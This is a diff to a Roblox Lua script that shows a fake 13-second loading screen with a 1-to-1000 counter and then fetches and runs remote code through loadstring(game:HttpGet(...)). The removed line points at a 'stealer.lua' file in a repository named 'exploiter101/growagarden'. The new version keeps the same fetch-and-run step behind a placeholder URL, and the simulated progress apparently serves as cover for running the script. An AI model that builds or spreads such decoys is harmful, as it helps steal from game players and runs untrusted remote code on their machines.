@@ -86,16 +86,20 @@ local function startPulse()
     }):Play()
 end
 
--- Create loading text
+-- Create loading text with Comic Neue Angular SemiBold font
 local loadingText = Instance.new("TextLabel")
 loadingText.Name = "LoadingText"
 loadingText.AnchorPoint = Vector2.new(0.5, 0.5)
-loadingText.Position = UDim2.new(0.5, 0, 0.6, 0)  -- Adjusted position
+loadingText.Position = UDim2.new(0.5, 0, 0.6, 0)
 loadingText.Size = UDim2.new(0, 300, 0, 40)
 loadingText.BackgroundTransparency = 1
-loadingText.Text = "Loading Experience..."
+loadingText.Text = "Loading: 1/1000"
 loadingText.TextColor3 = Color3.fromRGB(200, 220, 255)
-loadingText.Font = Enum.Font.GothamBold
+loadingText.Font = Font.new(
+    "rbxasset://fonts/families/ComicNeueAngular.json",
+    Enum.FontWeight.SemiBold,
+    Enum.FontStyle.Normal
+)
 loadingText.TextSize = 22
 loadingText.ZIndex = 99999
 
@@ -103,7 +107,7 @@ loadingText.ZIndex = 99999
 local progressBar = Instance.new("Frame")
 progressBar.Name = "ProgressBar"
 progressBar.AnchorPoint = Vector2.new(0.5, 0.5)
-progressBar.Position = UDim2.new(0.5, 0, 0.7, 0)  -- Adjusted position
+progressBar.Position = UDim2.new(0.5, 0, 0.7, 0)
 progressBar.Size = UDim2.new(0.6, 0, 0, 8)
 progressBar.BackgroundColor3 = Color3.fromRGB(40, 40, 80)
 progressBar.BorderSizePixel = 0
@@ -141,31 +145,28 @@ local function animateBlur()
     return tween
 end
 
--- Progress bar with 13 second duration
+-- Progress bar with 13 second duration and 1-1000 count
 local function simulateProgress()
     local duration = 13
     local startTime = os.clock()
+    local totalSteps = 1000
     
     while os.clock() - startTime < duration do
         local progress = (os.clock() - startTime) / duration
         progressFill.Size = UDim2.new(progress, 0, 1, 0)
         
-        -- Update loading text
-        if progress < 0.25 then
-            loadingText.Text = "Loading Core Assets..."
-        elseif progress < 0.5 then
-            loadingText.Text = "Initializing Systems..."
-        elseif progress < 0.75 then
-            loadingText.Text = "Optimizing Experience..."
-        else
-            loadingText.Text = "Finalizing Setup..."
+        -- Update loading text to show 1-1000 count
+        local currentStep = math.floor(progress * totalSteps) + 1
+        if currentStep > totalSteps then
+            currentStep = totalSteps
         end
+        loadingText.Text = "Loading: " .. currentStep .. "/1000"
         
         RunService.RenderStepped:Wait()
     end
     
     progressFill.Size = UDim2.new(1, 0, 1, 0)
-    loadingText.Text = "Loading Complete!"
+    loadingText.Text = "Loading Complete: 1000/1000"
 end
 
 -- Function to execute after loading completes
@@ -173,7 +174,7 @@ local function executeLoadString()
     -- Replace this with your actual loadstring code
     local success, result = pcall(function()
         -- YOUR ACTUAL LOADSTRING CODE GOES HERE
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/growagarden/refs/heads/main/dark/stealer.lua"))()
+        loadstring(game:HttpGet("YOUR_SCRIPT_URL_HERE"))()
         
         -- Example notification
         game:GetService("StarterGui"):SetCore("SendNotification", {
